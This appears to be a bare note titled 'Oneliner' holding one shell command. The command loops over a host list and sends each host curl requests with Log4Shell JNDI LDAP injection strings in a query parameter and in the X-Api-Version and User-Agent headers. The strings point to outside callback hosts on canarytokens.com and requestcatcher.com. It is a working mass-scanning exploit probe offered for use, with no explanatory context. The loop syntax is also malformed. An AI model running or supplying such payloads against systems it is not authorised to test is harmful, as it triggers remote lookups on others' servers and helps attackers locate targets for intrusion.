# Oneliner
$ cat 1.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://L4J.kt0p4r4sr8ax2cb8213b9v9qr.canarytokens.com/a}" -H
"X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://L4J.kt0p4r4sr8ax2cb8213b9v9qr.canarytokens.com/a}";done 

